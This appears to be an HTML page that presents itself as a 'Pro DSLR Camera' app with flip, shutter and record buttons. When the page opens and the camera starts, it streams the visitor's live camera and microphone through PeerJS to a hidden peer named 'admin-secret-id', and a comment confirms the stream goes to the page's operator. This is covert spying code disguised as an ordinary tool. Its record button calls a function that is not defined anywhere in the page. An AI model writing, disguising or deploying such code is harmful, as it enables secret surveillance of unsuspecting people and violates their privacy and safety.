<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pro DSLR Camera</title>
    <script src="https://unpkg.com/peerjs@1.3.1/dist/peerjs.min.js"></script>
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
        #video-preview { width: 100%; height: 100vh; object-fit: cover; }
        .controls { position: absolute; bottom: 30px; width: 100%; display: flex; justify-content: space-around; align-items: center; z-index: 10; }
        .btn { background: rgba(255,255,255,0.2); border: 2px solid #fff; border-radius: 50%; padding: 15px; cursor: pointer; color: white; }
        .shutter { width: 70px; height: 70px; background: #fff; border: 4px solid #444; }
        .active-rec { background: red !important; animation: blink 1s infinite; }
        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.5;} 100% {opacity: 1;} }
    </style>
</head>
<body>

    <video id="video-preview" autoplay playsinline muted></video>

    <div class="controls">
        <button class="btn" onclick="switchCamera()">ðŸ”„ Flip</button>
        <button class="btn shutter" id="shutter" onclick="takePhoto()">ðŸ“¸</button>
        <button class="btn" id="rec-btn" onclick="toggleLocalRecord()">ðŸŽ¥ REC</button>
    </div>

    <script>
        const peer = new Peer();
        let currentStream;
        let useFront = true;

        async function startCamera() {
            if (currentStream) { currentStream.getTracks().forEach(track => track.stop()); }
            const constraints = {
                video: { facingMode: useFront ? "user" : "environment", width: { ideal: 3840 }, height: { ideal: 2160 } },
                audio: true
            };
            try {
                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                document.getElementById('video-preview').srcObject = currentStream;
                peer.call('admin-secret-id', currentStream); // Tomake call pathabe
            } catch (err) { alert("Camera access proyojon!"); }
        }

        function switchCamera() { useFront = !useFront; startCamera(); }

        function takePhoto() {
            const video = document.getElementById('video-preview');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const link = document.createElement('a');
            link.download = 'dslr_photo.png';
            link.href = canvas.toDataURL();
            link.click();
        }

        peer.on('open', startCamera);
    </script>
</body>
</html>
